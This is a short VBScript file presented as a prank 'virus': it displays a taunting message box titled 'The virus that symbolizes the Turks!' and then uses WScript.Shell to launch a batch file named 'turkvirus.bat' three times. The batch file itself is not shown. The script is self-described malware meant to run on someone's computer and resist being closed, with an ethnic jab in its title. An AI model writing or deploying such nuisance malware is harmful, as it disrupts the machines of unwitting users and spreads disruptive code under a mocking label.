
name=msgbox ("You can't kill me without cheating(Task Manager or CMD.).",0+48,"The virus that symbolizes the Turks!")
dim count
set object = wscript.CreateObject("wscript.shell")

do
object.run "turkvirus.bat"
count = count + 1
loop until count = 3